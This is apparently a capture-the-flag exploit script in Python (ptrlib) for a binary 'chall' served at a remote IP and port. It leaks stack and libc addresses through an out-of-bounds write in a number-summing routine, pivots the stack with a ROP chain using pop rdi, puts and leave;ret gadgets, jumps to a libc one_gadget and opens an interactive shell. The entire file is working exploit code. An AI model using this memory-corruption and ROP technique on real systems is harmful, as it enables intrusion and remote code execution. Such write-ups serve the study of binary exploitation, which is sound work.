from ptrlib import *

def calc_sum(n, array):
    sock.sendlineafter("n = ", str(n))
    for elm in array:
        sock.sendlineafter(" = ", str(elm))
    sock.recvuntil("SUM = ")
    return int(sock.recvline())

elf = ELF("../distfiles/chall")
rop_pop_rdi = 0x00400a83
rop_ret = 0x00400646
rop_leave_ret = 0x00400849

"""
libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("../distfiles/chall")
libc_one_gadget = 0x10a38c
"""
libc = ELF("../distfiles/libc-2.23.so")
sock = Socket("13.231.207.73", 9005)
libc_one_gadget = 0xf02a4
#"""

# 1) leak stack address
#  We get 14+14+(array)+(canary)+(array+0xb0)+(_start)
n, payload = 22, [0 for i in range(16)]
payload[-2] = 20
payload[-1] = elf.symbol("_start")
r1 = calc_sum(n, payload)
logger.info("r1 = " + str(r1))
#  We get 14+14+(array-0xe0)+(canary)+(_start)
n, payload = 22, [0 for i in range(19)]
payload[-5] = 17
payload[-4] = 0
payload[-3] = 0
payload[-2] = 0 # saved rbp = 0
payload[-1] = elf.symbol("_start")
r2 = calc_sum(n, payload)
logger.info("r2 = " + str(r2))
#  Now we can calculate the address of array
addr_array = (r1 - 28 - 0xb0) - (r2 - 28 + 0xe0)
logger.info("array = " + hex(addr_array))

# 2) leak libc base
#  We can overwrite saved rbp to our rop chain (array)
#  and return to `leave` gadget will execute the chain
n, payload = 22, [0 for i in range(17)]
payload[1] = rop_pop_rdi
payload[2] = elf.got("puts")
payload[3] = elf.plt("puts")
payload[4] = elf.symbol("_start")
payload[-3] = 19
payload[-2] = addr_array - 0x1c0
payload[-1] = rop_leave_ret
calc_sum(n, payload)
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

# 3) get the shell!
n, payload = 22, [0 for i in range(16)]
payload[-2] = 20
payload[-1] = libc_base + libc_one_gadget
calc_sum(n, payload)

sock.interactive()
